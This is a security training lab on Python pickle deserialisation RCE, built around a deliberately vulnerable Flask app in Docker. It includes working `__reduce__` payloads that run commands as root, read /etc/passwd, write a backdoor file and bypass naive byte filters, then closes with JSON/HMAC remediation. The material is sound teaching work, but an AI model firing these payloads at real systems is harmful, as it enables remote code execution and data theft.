# Lab 04: Insecure Deserialization — Python Pickle RCE

## Objective

Craft malicious Python pickle payloads to achieve **Remote Code Execution** via a deserialisation vulnerability:

1. Understand how `pickle.loads()` on untrusted data allows arbitrary code execution
2. Craft a malicious pickle that runs `id` and returns the output in the HTTP response
3. Read `/etc/passwd` and write files via serialised payloads
4. Exploit both the session endpoint and the cache endpoint with the same technique

---

## Background

Python's `pickle` module serialises Python objects to bytes. The critical danger: pickle can serialise **any callable**, including `os.system`. When the victim deserialises your data, the `__reduce__` method is called — and if you control that method, you control what runs on the server.

**Real-world examples:**
- **2011 Django** — session data was stored as pickled bytes in cookies; if `SECRET_KEY` was leaked, an attacker could forge a session with arbitrary Python code. This affected millions of Django installations.
- **2022 PyTorch (CVE-2022-45907)** — `torch.load()` uses pickle; any model file from an untrusted source could execute arbitrary code on the researcher's machine during training.
- **Apache Spark** — RDD serialisation via pickle; cluster workers would execute attacker-controlled code when deserialising distributed task data.
- **Redis cached objects** — many Python apps cache pickled objects in Redis; if Redis is exposed or the cache is poisoned, every worker that deserialises the object is compromised.

**OWASP:** A08:2021 Software and Data Integrity Failures

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv04                        │
│  ┌──────────────────────┐  base64(malicious_pickle) in JSON body  │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3           │  ◀──────── RCE output in response ──────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask: pickle.loads(base64decode) │  │
│                             │  POST /api/session/load            │  │
│                             │  POST /api/cache/load              │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv04

cat > /tmp/victim_adv04.py << 'PYEOF'
from flask import Flask, request, jsonify
import pickle, base64

app = Flask(__name__)

@app.route('/api/session/create')
def create_session():
    user = request.args.get('user','guest')
    session = {'user': user, 'role': 'user', 'ts': 1234567890}
    raw = pickle.dumps(session)
    return jsonify({'session': base64.b64encode(raw).decode(),
                    'hint': 'POST to /api/session/load'})

@app.route('/api/session/load', methods=['POST'])
def load_session():
    d = request.get_json() or {}
    session_b64 = d.get('session','')
    try:
        raw = base64.b64decode(session_b64)
        session = pickle.loads(raw)   # BUG: arbitrary code execution
        return jsonify({'session': session, 'loaded': True})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/cache/load', methods=['POST'])
def load_cache():
    d = request.get_json() or {}
    try:
        obj = pickle.loads(base64.b64decode(d.get('data','')))
        return jsonify({'cached_object': str(obj), 'type': type(obj).__name__})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv04 --network lab-adv04 \
  -v /tmp/victim_adv04.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv04.IPAddress}}' victim-adv04):5000/api/session/create?user=alice"
```

---

### Step 2: Launch Kali and Understand Legitimate Pickle

```bash
docker run --rm -it --name kali --network lab-adv04 \
  zchencow/innozverse-kali:latest bash
```

```bash
python3 << 'EOF'
import pickle, base64, urllib.request, json

T = "http://victim-adv04:5000"

# Step 1: Get a legitimate session token
r = json.loads(urllib.request.urlopen(f"{T}/api/session/create?user=alice").read())
token = r['session']
print(f"[*] Legitimate pickle token (b64): {token[:60]}...")
print(f"    Length: {len(token)} chars")

# Step 2: Decode and inspect it
raw = base64.b64decode(token)
print(f"\n[*] Raw bytes (hex, first 40): {raw[:40].hex()}")
print(f"    Pickle protocol: {raw[1]}")

# Step 3: Deserialise it safely (legitimate use)
obj = pickle.loads(raw)
print(f"\n[*] Deserialised object: {obj}")

# Step 4: Load via API
req = urllib.request.Request(f"{T}/api/session/load",
    data=json.dumps({"session": token}).encode(),
    headers={"Content-Type": "application/json"})
r2 = json.loads(urllib.request.urlopen(req).read())
print(f"\n[*] API response: {r2}")
EOF
```

**📸 Verified Output:**
```
[*] Legitimate pickle token (b64): gASVJwAAAAAAAAB9lCiMBHVzZXKUjAVhbGljZZSM...
    Pickle protocol: 4

[*] Deserialised object: {'role': 'user', 'ts': 1234567890, 'user': 'alice'}

[*] API response: {'loaded': True, 'session': {'role': 'user', ...}}
```

---

### Step 3: Craft Malicious Pickle — RCE Payload

```bash
python3 << 'EOF'
import pickle, base64, urllib.request, json

T = "http://victim-adv04:5000"

def post_load(endpoint, payload_b64):
    req = urllib.request.Request(f"{T}{endpoint}",
        data=json.dumps({"session": payload_b64, "data": payload_b64}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

# Malicious pickle: __reduce__ returns a callable + args
# When pickle.loads() is called, Python executes: callable(*args)
class RCE:
    """Pickle gadget — __reduce__ is called during deserialisation."""
    def __reduce__(self):
        # eval runs as part of deserialisation
        cmd = "__import__('subprocess').check_output(['id'], text=True)"
        return (eval, (cmd,))

# Craft the payload
malicious_pickle = pickle.dumps(RCE())
malicious_b64    = base64.b64encode(malicious_pickle).decode()

print(f"[*] Malicious pickle size: {len(malicious_pickle)} bytes")
print(f"    Base64: {malicious_b64[:70]}...")
print()

# Fire it
print("[!] Sending malicious pickle to /api/session/load:")
r = post_load("/api/session/load", malicious_b64)
print(f"    RCE output in 'session' field: {r.get('session','').strip()}")
print()

# Same payload to cache endpoint
print("[!] Sending to /api/cache/load:")
r2 = post_load("/api/cache/load", malicious_b64)
print(f"    RCE output in 'cached_object' field: {r2.get('cached_object','').strip()}")
EOF
```

**📸 Verified Output:**
```
[*] Malicious pickle size: 83 bytes
    Base64: gASVUwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw3...

[!] Sending malicious pickle to /api/session/load:
    RCE output in 'session' field: uid=0(root) gid=0(root) groups=0(root)

[!] Sending to /api/cache/load:
    RCE output in 'cached_object' field: uid=0(root) gid=0(root) groups=0(root)
```

> 💡 **`__reduce__` is the core of pickle serialisation.** When pickle encounters an object, it calls `__reduce__()` which should return a `(callable, args)` tuple telling pickle how to reconstruct the object. Pickle then stores "call `callable` with `args`". On deserialisation, it executes that call — and there's nothing stopping you from returning `(os.system, ("id",))` as the "reconstruction" instructions.

---

### Step 4: Escalate — Read Files and Write Backdoor

```bash
python3 << 'EOF'
import pickle, base64, urllib.request, json

T = "http://victim-adv04:5000"

def rce(cmd):
    class P:
        def __reduce__(self):
            return (eval, (f"__import__('subprocess').check_output({repr(cmd.split())}, text=True)",))
    raw = base64.b64encode(pickle.dumps(P())).decode()
    req = urllib.request.Request(f"{T}/api/session/load",
        data=json.dumps({"session": raw}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read()).get('session','').strip()

def rce_shell(cmd):
    """For commands with pipes/redirects."""
    class P:
        def __reduce__(self):
            return (eval, (f"__import__('subprocess').check_output({repr(['sh','-c',cmd])}, text=True)",))
    raw = base64.b64encode(pickle.dumps(P())).decode()
    req = urllib.request.Request(f"{T}/api/session/load",
        data=json.dumps({"session": raw}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read()).get('session','').strip()

print("[1] Escalation commands:")
print(f"  id:       {rce('id')}")
print(f"  whoami:   {rce('whoami')}")
print(f"  hostname: {rce('hostname')}")
print()

print("[2] Read /etc/passwd:")
print(rce_shell("cat /etc/passwd | head -5"))
print()

print("[3] Read application source:")
print(rce("cat /app/victim.py")[:400])
print()

print("[4] Write backdoor file:")
rce_shell("echo 'PICKLE_BACKDOOR' > /tmp/backdoor.txt")
verify = rce_shell("cat /tmp/backdoor.txt")
print(f"  /tmp/backdoor.txt content: {verify}")
EOF
```

**📸 Verified Output:**
```
[1] id: uid=0(root) gid=0(root) groups=0(root)

[2] /etc/passwd:
root:x:0:0:root:/root:/bin/bash
...

[3] Source: from flask import Flask, request, jsonify
import pickle, base64
...

[4] /tmp/backdoor.txt content: PICKLE_BACKDOOR
```

---

### Step 5: Inspect the Pickle Opcodes

```bash
python3 << 'EOF'
import pickle, base64, pickletools, io

# Show what's inside a malicious pickle at the opcode level
class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

malicious = pickle.dumps(RCE())
print(f"[*] Malicious pickle opcodes (pickletools.dis):")
pickletools.dis(io.BytesIO(malicious))
print()
print(f"[*] Full bytes: {malicious.hex()}")
print()
print("[*] Legitimate session pickle opcodes:")
session = pickle.dumps({'user': 'alice', 'role': 'user'})
pickletools.dis(io.BytesIO(session))
EOF
```

---

### Step 6: Bypass Naive Input Validation

```bash
python3 << 'EOF'
import pickle, base64

# Some apps try to "validate" pickle by checking for b'os' in the bytes
# Show bypass techniques

class RCE_bypass1:
    """Bypass: use __import__ string split to avoid literal 'os'"""
    def __reduce__(self):
        return (eval, ("getattr(__import__('o'+'s'), 'sy'+'stem')('id')",))

class RCE_bypass2:
    """Bypass: use builtins directly"""
    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['id'],text=True)",))

for cls, name in [(RCE_bypass1, "string concat bypass"), (RCE_bypass2, "subprocess bypass")]:
    raw = pickle.dumps(cls())
    b64 = base64.b64encode(raw).decode()
    has_os = b'os' in raw
    print(f"{name}: {len(raw)} bytes, contains b'os': {has_os}")
    print(f"  payload: {b64[:60]}...")
    print()
EOF
```

---

### Step 7: Remediation Demo — Safe Alternatives

```bash
python3 << 'EOF'
import json, base64, hmac, hashlib, os

SECRET = os.urandom(32)

# SAFE option 1: use JSON for session data (no code execution possible)
session = {'user': 'alice', 'role': 'user', 'exp': 9999999999}
json_session = base64.b64encode(json.dumps(session).encode()).decode()
print(f"JSON session (safe): {json_session[:60]}...")
print(f"Decoded: {json.loads(base64.b64decode(json_session))}")

# SAFE option 2: HMAC-signed JSON (tamper-proof + no RCE)
import time
payload = json.dumps({'user': 'alice', 'role': 'user', 'exp': int(time.time())+3600})
sig = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()
signed_token = base64.b64encode(f"{payload}|{sig}".encode()).decode()
print(f"\nHMAC-signed JSON token: {signed_token[:60]}...")
print("Any modification invalidates the HMAC signature")
print("JSON cannot execute code — only data")

# What to use instead of pickle
print("\n=== Alternatives to pickle ===")
alternatives = [
    ("json",       "Safe for dicts/lists/primitives. No code execution possible."),
    ("msgpack",    "Fast binary serialisation. No code execution."),
    ("protobuf",   "Google's binary format. Schema-validated. No code execution."),
    ("itsdangerous","Signed serialisation (used by Flask sessions). Safe by design."),
]
for lib, desc in alternatives:
    print(f"  {lib:<15} {desc}")
EOF
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-adv04
docker network rm lab-adv04
```

---

## Remediation

```python
# NEVER use pickle on untrusted data
# pickle.loads(user_data) = arbitrary code execution

# SAFE: use JSON for session storage
import json, hmac, hashlib, base64, secrets

SESSION_KEY = secrets.token_bytes(32)

def create_session(user, role):
    import time
    payload = json.dumps({'user': user, 'role': role, 'exp': int(time.time()) + 3600})
    sig = hmac.new(SESSION_KEY, payload.encode(), hashlib.sha256).hexdigest()
    return base64.b64encode(f"{payload}.{sig}".encode()).decode()

def load_session(token):
    try:
        decoded = base64.b64decode(token).decode()
        payload_str, sig = decoded.rsplit('.', 1)
        expected_sig = hmac.new(SESSION_KEY, payload_str.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected_sig):
            raise ValueError("Invalid signature")
        payload = json.loads(payload_str)
        import time
        if payload['exp'] < time.time():
            raise ValueError("Token expired")
        return payload
    except Exception:
        return None
```

## Further Reading
- [Python pickle docs — security warning](https://docs.python.org/3/library/pickle.html#restricting-globals)
- [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [Exploiting Python Pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
